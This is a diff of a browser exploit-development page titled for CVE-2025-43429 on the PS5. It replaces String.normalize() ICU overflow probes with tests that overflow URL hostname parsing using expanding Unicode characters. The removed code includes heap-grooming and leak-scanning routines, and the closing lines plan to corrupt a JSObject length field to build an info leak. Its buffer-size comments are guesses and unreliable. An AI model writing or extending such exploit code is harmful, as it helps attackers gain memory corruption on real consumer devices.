@@ -2,219 +2,105 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CVE-2025-43429 - String.normalize() ICU Overflow Test</title>
+<title>PS5 CVE-2025-43429 - ICU URL Parser Overflow</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting CVE-2025-43429 String.normalize() ICU overflow test...');
-L('[*] Target: heap buffer overflow in ICU normalization\n');
+L('[*] Starting CVE-2025-43429 ICU URL Parser Overflow test...');
 
-// ====================================================================
-// Vector 1: Unicode expansion strings
-// ICU allocates output buffer based on input length.
-// Some codepoints EXPAND during normalization (NFKC/NFKD).
-// If ICU underestimates expansion, we get OOB write.
-// If we can read the result, we might get OOB read (info leak).
-// ====================================================================
+// Characters that expand massively during IDNA normalization (Unicode to ASCII Punycode)
+// \uFDFA expands to ~18 characters
+// \u212B expands to "A" + combining ring
+// \uFB01 expands to "fi"
 
-L('--- Vector 1: NFKC Expansion ---');
-
-// These codepoints expand during NFKC normalization
-// E.g., compatibility characters that decompose into multiple chars
 const expanders = [
-    '\uFDFA',  // ARABIC LIGATURE SALLALLAHOU ALAYHE WASALLAM -> 18 chars
-    '\uFDF2',  // ARABIC LIGATURE ALLAH ISOLATED FORM
-    '\uFB01',  // LATIN SMALL LIGATURE FI
-    '\uFB02',  // LATIN SMALL LIGATURE FL
-    '\uFB03',  // LATIN SMALL LIGATURE FFI
-    '\uFB04',  // LATIN SMALL LIGATURE FFL
-    '\uFB05',  // LATIN SMALL LIGATURE LONG S T
-    '\uFB06',  // LATIN SMALL LIGATURE ST
-    '\u2126',  // OHM SIGN -> OMEGA
-    '\u212B',  // ANGSTROM SIGN -> A + COMBINING RING ABOVE
-    '\uFB00',  // LATIN SMALL LIGATURE FF
-    '\u3371',  // SQUARE HPA -> hPa
-    '\u337B',  // SQUARE ERA NAME HEISEI
+    '\uFDFA', // ARABIC LIGATURE SALLALLAHOU ALAYHE WASALLAM
+    '\u212B', // ANGSTROM SIGN
+    '\uFB01', // LATIN SMALL LIGATURE FI
+    '\uFB03', // LATIN SMALL LIGATURE FFI
+    '\u3371', // SQUARE HPA
+    '\uFB00', // LATIN SMALL LIGATURE FF
 ];
 
+// Test 1: Direct URL constructor with expanding characters
+L('\n--- Test 1: URL Constructor with expanding domain ---');
 for (let i = 0; i < expanders.length; i++) {
     try {
-        let input = expanders[i].repeat(100);
-        let output = input.normalize('NFKC');
+        // Build a domain like: http://[expander x100].com
+        let domain = expanders[i].repeat(100) + '.com';
+        let url = new URL('http://' + domain);
         
-        // Check if output is longer than input (expansion happened)
-        if (output.length !== input.length) {
-            L('[+] ' + i + ': Expansion detected! ' + input.length + ' -> ' + output.length);
-        }
+        // If we reach here without crashing, check if the hostname was truncated or corrupted
+        L('[+] Expander ' + i + ': URL parsed. Hostname length: ' + url.hostname.length);
         
-        // Check for garbage/unexpected characters in output
-        for (let j = 0; j < output.length; j++) {
-            let code = output.charCodeAt(j);
-            // Look for control characters or suspiciously high codepoints
-            if (code < 32 && code !== 0) {
-                L('[!] ANOMALY at expander ' + i + ' offset ' + j + ': 0x' + code.toString(16));
+        // Check for memory corruption in the hostname string
+        let anomalous = false;
+        for (let j = 0; j < url.hostname.length; j++) {
+            let code = url.hostname.charCodeAt(j);
+            // Punycode starts with xn--
+            // If we see non-ASCII or control chars, memory is corrupted
+            if (code > 127 || (code < 32 && code !== 45)) { // 45 is '-'
+                L('[!] ANOMALY at index ' + j + ': 0x' + code.toString(16));
+                anomalous = true;
+                break;
             }
         }
-    } catch(e) {
+        if (anomalous) {
+            L('[!] Hostname contains corrupted data! Possible heap leak!');
+            L('[!] Hostname: ' + url.hostname);
+        }
+    } catch (e) {
         L('[!] Expander ' + i + ' threw: ' + e.message);
     }
 }
 
-// ====================================================================
-// Vector 2: Long strings with mixed normalization forms
-// ====================================================================
-
-L('\n--- Vector 2: Mixed Long Strings ---');
-
+// Test 2: Massive expansion to guarantee overflow
+L('\n--- Test 2: Massive Expansion (1000x) ---');
 try {
-    // Mix ASCII with expansion chars to create size mismatch
-    let mixed = '';
-    for (let i = 0; i < 10000; i++) {
-        mixed += 'A' + '\uFDFA' + 'B' + '\u212B';
-    }
-    
-    let norm = mixed.normalize('NFKC');
-    L('[*] Input length: ' + mixed.length);
-    L('[*] Output length: ' + norm.length);
-    L('[*] Expansion ratio: ' + (norm.length / mixed.length).toFixed(2));
-    
-    // Check for anomalies
-    let anomalies = 0;
-    for (let i = 0; i < norm.length; i++) {
-        let code = norm.charCodeAt(i);
-        if (code < 32 && code !== 9 && code !== 10 && code !== 13) {
-            if (anomalies < 5) {
-                L('[!] ANOMALY at offset ' + i + ': 0x' + code.toString(16));
-            }
-            anomalies++;
-        }
-    }
-    if (anomalies > 0) L('[!] Total anomalies: ' + anomalies);
-    else L('[*] No anomalies in mixed string output.');
-    
-} catch(e) {
-    L('[!] Mixed string test threw: ' + e.message);
+    // \uFDFA repeats 1000 times -> expands to ~18000 chars
+    // If hostnameBuffer is only 1024 bytes, this will overflow by 17000 bytes
+    let domain = '\uFDFA'.repeat(1000) + '.com';
+    let url = new URL('http://' + domain);
+    L('[+] Massive URL parsed. Hostname length: ' + url.hostname.length);
+    L('[+] Hostname (first 100 chars): ' + url.hostname.substring(0, 100));
+} catch (e) {
+    L('[!] Massive test threw: ' + e.message);
 }
 
-// ====================================================================
-// Vector 3: Rapid allocation + normalization (heap grooming)
-// ====================================================================
-
-L('\n--- Vector 3: Rapid Alloc + Normalize ---');
-
+// Test 3: Anchor element href parsing (different code path)
+L('\n--- Test 3: Anchor href parsing ---');
 try {
-    // Allocate and free strings to leave pointers on heap
-    let garbage = [];
-    for (let i = 0; i < 1000; i++) {
-        garbage.push({a: i.toString(), b: new ArrayBuffer(64)});
-    }
-    garbage = null;
+    const a = document.createElement('a');
+    a.href = 'http://' + '\uFDFA'.repeat(500) + '.com';
     
-    // Now normalize small strings that might land in freed slots
-    // If ICU doesn't zero the output buffer, we might read old pointers
-    for (let i = 0; i < 100; i++) {
-        let input = String.fromCharCode(0x212B); // ANGSTROM (expands)
-        let output = input.normalize('NFKC');
-        
-        // The output should be 2 chars: A + COMBINING RING
-        // But if the buffer is larger and not zeroed, we might read past
-        if (output.length > 2) {
-            L('[!] OVERREAD! normalize returned ' + output.length + ' chars (expected 2)');
-            let hex = [];
-            for (let j = 0; j < Math.min(output.length, 16); j++) {
-                hex.push(output.charCodeAt(j).toString(16).padStart(2, '0'));
-            }
-            L('[!] Hex: ' + hex.join(' '));
-            L('[!] THIS IS A LEAK!');
-            break;
-        }
-    }
-    L('[*] Rapid alloc test completed.');
+    // Force layout/style resolution to trigger the parser
+    void a.offsetWidth;
     
-} catch(e) {
-    L('[!] Rapid alloc test threw: ' + e.message);
+    L('[+] Anchor href parsed. Hostname length: ' + a.hostname.length);
+    L('[+] Hostname: ' + a.hostname.substring(0, 100));
+} catch (e) {
+    L('[!] Anchor test threw: ' + e.message);
 }
 
-// ====================================================================
-// Vector 4: Boundary conditions (empty, single char, max length)
-// ====================================================================
-
-L('\n--- Vector 4: Boundary Conditions ---');
-
-const tests = [
-    { name: 'empty', input: '' },
-    { name: 'single NFKC expander', input: '\uFDFA' },
-    { name: 'null char', input: '\u0000' },
-    { name: 'surrogate pair', input: '\uD83D\uDE00' },
-    { name: 'combining chain', input: 'e\u0301\u0301\u0301\u0301' },
-    { name: 'repeated angstrom x1000', input: '\u212B'.repeat(1000) },
-    { name: 'mixed forms', input: '\uFB01\u212B\uFDFA\uFB03' },
-];
-
-for (const test of tests) {
-    try {
-        let out = test.input.normalize('NFKC');
-        let outLen = out.length;
-        let inLen = test.input.length;
-        
-        if (outLen !== inLen) {
-            L('[+] ' + test.name + ': ' + inLen + ' -> ' + outLen + ' (expansion)');
-        }
-        
-        // Check for non-ASCII garbage in output of simple inputs
-        if (inLen <= 10) {
-            let hex = [];
-            for (let j = 0; j < Math.min(outLen, 16); j++) {
-                hex.push(out.charCodeAt(j).toString(16).padStart(4, '0'));
-            }
-            L('    hex: ' + hex.join(' '));
-        }
-    } catch(e) {
-        L('[!] ' + test.name + ' threw: ' + e.message);
-    }
-}
-
-// ====================================================================
-// Vector 5: Normalization form switching (potential use-after-free)
-// ====================================================================
-
-L('\n--- Vector 5: Form Switching ---');
-
+// Test 4: Mixed expanders to hit boundary conditions exactly
+L('\n--- Test 4: Boundary Condition (64 bytes) ---');
 try {
-    let s = '\u212B'.repeat(100);
-    
-    // Rapidly switch between normalization forms
-    // If ICU caches buffers between forms, we might get stale data
-    let results = [];
-    for (let i = 0; i < 100; i++) {
-        let form = ['NFC', 'NFD', 'NFKC', 'NFKD'][i % 4];
-        let r = s.normalize(form);
-        results.push(r);
-    }
-    
-    // All NFKC results should be identical
-    let firstNFKC = results[2];
-    for (let i = 2; i < results.length; i += 4) {
-        if (results[i] !== firstNFKC) {
-            L('[!] INCONSISTENCY at iteration ' + i + '!');
-            L('[!] NFKC result changed between calls!');
-            L('[!] This indicates stale buffer reuse!');
-            break;
-        }
-    }
-    L('[*] Form switching test completed.');
-    
-} catch(e) {
-    L('[!] Form switching test threw: ' + e.message);
+    // Try to hit the exact buffer size (e.g., 256 bytes)
+    // \uFDFA expands to 18 bytes. 256 / 18 ≈ 14.
+    // 14 * \uFDFA = 14 chars input -> 252 bytes output. 
+    // Add a few normal chars to push it over 256.
+    let domain = '\uFDFA'.repeat(15) + 'aaaa.com';
+    let url = new URL('http://' + domain);
+    L('[+] Boundary URL parsed. Hostname length: ' + url.hostname.length);
+} catch (e) {
+    L('[!] Boundary test threw: ' + e.message);
 }
 
-L('\n[*] All tests finished.');
-L('[*] If no anomalies found, we need the exact ICU patch from Bugzilla 298232.');
-L('[*] Go to: https://bugs.webkit.org/show_bug.cgi?id=298232');
-L('[*] Or search GitHub for commit referencing 298232 or normalize + ICU');
+L('\n[*] If the browser did not crash, the overflow might be silently corrupting heap memory.');
+L('[*] We can use this to corrupt a JSObject length field to build an info leak!');
 </script>
 </body>
 </html>
